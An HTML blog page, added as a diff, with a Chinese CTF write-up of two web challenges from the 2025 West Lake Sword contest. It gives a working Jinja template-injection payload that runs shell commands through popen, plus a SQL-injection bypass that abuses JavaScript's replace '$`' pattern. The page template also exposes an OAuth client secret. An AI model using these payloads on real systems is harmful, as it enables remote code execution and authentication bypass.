@@ -1,0 +1,330 @@
+<!DOCTYPE HTML>
+<html>
+<head >
+  <meta charset="utf-8">
+  
+  <title>第八届西湖论剑WP | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="WEB1题目来源：西湖论剑2025
+题目类型：WEB
+设计考点：SSTI
+
+
+Payload: 
+1&amp;#123;%for i in &amp;#x27;&amp;#x27;.__class__.__base__.__subclasses__()%&amp;#125;&amp;#123;%if i.__name__ ==&amp;#x27;">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="第八届西湖论剑WP"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+  
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-5005349780815724",
+    enable_page_level_ads: true
+  });
+</script>
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?223eea22355699157e147870eb124b24";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+  <link rel="manifest" href="/manifest.json">
+  <link href="/favicon.ico" rel="icon">
+
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    
+
+    <header class="header-container" style="background-image: url('/images/blog-bg.jpg');">
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <div class="navbar-header page-scroll">
+          <button type="button" id="tglBtn" class="navbar-toggle">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="/">John Doe</a>
+        </div>
+        <div id="bosenyblog-navbar">
+          <div class="navbar-collapse" id="bs-example-navbar-collapse-6">
+            <ul class="nav navbar-nav navbar-right">
+            
+              <li><a href="/">Home</a></li>
+            
+              <li><a href="/archives">Archives</a></li>
+            
+              <li><a href="/about">About</a></li>
+            
+              <li><a href="/tags">Tags</a></li>
+            
+            </ul>
+          </div>
+        </div>
+
+    </div>
+ </nav>
+ <div class="gotop-btn">
+
+ </div>
+</header>
+
+        
+          <div class="container ">
+          <div class="row">
+            <main class="site-main posts-loop col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container" style="position: inherit;">
+            <article class="article-container ">
+
+  
+    
+    <h3 class="article-title"><span>第八届西湖论剑WP</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/01/19/第八届西湖论剑WP/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-01-19T04:34:38.000Z">
+          2025-01-19
+        </time>
+      </a>
+    </span>
+    <br />
+    
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>
+题目类型：WEB<br>
+设计考点：SSTI</p>
+
+<p><img src="/../img/XHLJ/WEB1.png" alt="WEB1" title="web1"></p>
+<p>Payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+<p>首先分析页面，给了一个登录页面<br><img src="/../img/XHLJ/WEB1-2.png" alt="WEB1-2" title="web1-2"></p>
+<p>发现登录之后会提示某某账号不存在或者密码错误，看到他的response包<br><img src="/../img/XHLJ/WEB1-3.png" alt="WEB1-3" title="web1-3"></p>
+<p>发现他是用python写的后端，猜测可能是SSTI漏洞<br>直接打payload，测试发现&#x2F;斜杠被过滤，用request.cookie.x绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/../img/XHLJ/web1-6.png" alt="web" title="result"></p>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>
+题目类型：WEB<br>
+设计考点：JS框架,replace函数</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;</span><br><span class="line">    if(req.query.info)&#123;</span><br><span class="line">        if(req.url.match(/\,/ig))&#123;</span><br><span class="line">            res.end(&#x27;hacker1!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        var info = JSON.parse(req.query.info);</span><br><span class="line">        if(info.username&amp;&amp;info.password)&#123;</span><br><span class="line">            var username = info.username;</span><br><span class="line">            var password = info.password;</span><br><span class="line">            if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;</span><br><span class="line">                res.end(&#x27;hacker2!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            var sql = &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;</span><br><span class="line">            sql = sql.replace(&quot;&#123;username&#125;&quot;,username);</span><br><span class="line">            sql = sql.replace(&quot;&#123;password&#125;&quot;,password);</span><br><span class="line">            connection.query(sql,function (err,rs) &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                res.end(&#x27;error1&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                if(rs.length&gt;0)&#123;</span><br><span class="line">                res.sendFile(&#x27;/flag&#x27;);</span><br><span class="line">                &#125;else &#123;</span><br><span class="line">                res.end(&#x27;username or password error&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            res.end(&quot;please input the data&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&quot;please input the data&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>题目需要传入一个info值，格式是json，但是$req.url$后面过滤了逗号，这里用URL编码绕过，<br>继续审计后面，一个SQL语句，把我们传入的username还有password过滤后拼接到语句当中，但是把闭合符都给过滤了，这里引入JavaScript中replace的一个知识点</p>
+<p><img src="/../img/XHLJ/web2-1.png" alt="web2" title="知识点"></p>
+<p>我们这里就是用$&#96;来过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$` 例子:</span><br><span class="line">var a=&quot;i am not a dog dog&quot;</span><br><span class="line">a=a.replace(&quot;dog&quot;,&quot;$`cat&quot;)</span><br><span class="line">他后面的pattern值应该是找到第一个和dog匹配的位置，然后把$`替换成这个位置之前的字符串</span><br><span class="line">所以pattern=i am not a cat</span><br><span class="line">然后把a当中的dog替换成pattern</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以我们这里的$`可以识别成select * from userinfo where username = &#x27;,这里有一个单引号可以用来闭合</span><br><span class="line">构造payload</span><br><span class="line">&#123;&quot;username&quot;:&quot;$` or 1=1 --+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考WP：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw">https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw</a></p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    
+  
+</article>
+   
+    <div id="toc" class="toc-article ">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1"><span class="toc-number">1.</span> <span class="toc-text">WEB1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB2"><span class="toc-number">2.</span> <span class="toc-text">WEB2</span></a></li></ol>
+</div>
+
+
+  
+
+	<!-- async load  -->
+	<script>
+			function async(u, c) {
+				var d = document, t = 'script',
+						o = d.createElement(t),
+						s = d.getElementsByTagName(t)[0];
+				o.src = u;
+				if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+				s.parentNode.insertBefore(o, s);
+			}
+	</script>
+	<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+	<script>
+			async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+					anchors.options = {
+						visible: 'hover',
+						placement: 'left',
+						// icon: '#'
+					};
+					anchors.add().remove('.article-title').remove('.subheading').remove('.sidebar-container h5');
+			})
+	</script>
+	<style>
+			/* place left on bigger screen */
+			@media all and (min-width: 800px) {
+					.anchorjs-link{
+							position: absolute;
+							left: -0.75em;
+							font-size: 1.1em;
+							margin-top : -0.1em;
+					}
+			}
+	</style>
+
+
+
+
+<!-- UY BEGIN -->
+	<div id="gitment-container"></div>
+	<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+	<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+	<script src="/js/web-pinyin.js"></script>
+	<script>
+		function toUnicode(s){ 
+			return s.replace(/([\u4E00-\u9FA5]|[\uFE30-\uFFA0])/g,function(){
+			return "\\u" + RegExp["$1"].charCodeAt(0).toString(16);
+			});
+		}
+		var title = '第八届西湖论剑WP'
+		var GitHub_id = 'Boseny'
+		var client_id = 'f40c67d0359a2646d2b1'
+		var client_secret = '1cbedbd1a1a2e4b42901aee3d7afe1856c1b7e2d'
+		var repo = 'boseny.me'
+		var gitment = new Gitment({
+		// id: '页面 ID', // 可选。默认为 location.href
+		// id:"11" ,
+		id: title,
+		title: title,
+		owner: GitHub_id,//'你的 GitHub ID',
+		repo: repo,//'存储评论的 repo',
+		oauth: {
+			client_id: client_id,//'你的 client ID',
+			client_secret: client_secret,//'你的 client secret',
+		},
+		})
+		gitment.render('gitment-container')
+	</script>
+<!-- UY END -->
+
+
+
+
+            </main>
+          </div>
+        </div>
+       
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/BosenY/Lap" target="_blank">Lap</a>
+    <br/><span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    </br>
+    
+      
+        &copy; 2025 John Doe
+      
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-92842840-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+  </div>
+
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.bootcss.com/vue/2.5.13/vue.min.js"></script>
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+  <script src="https://unpkg.com/draw-something/dist/draw.min.js"></script>
+  <script>
+    let maxNum = Number.parseInt('10')
+    let iconText = '❤'
+    let color = 'red'
+    new Draw({maxNum, iconText, color})
+  </script>
+
+<script src="/js/index.js"></script>
+<script src="/js/search.js"></script>
+
+</body>
+</html>
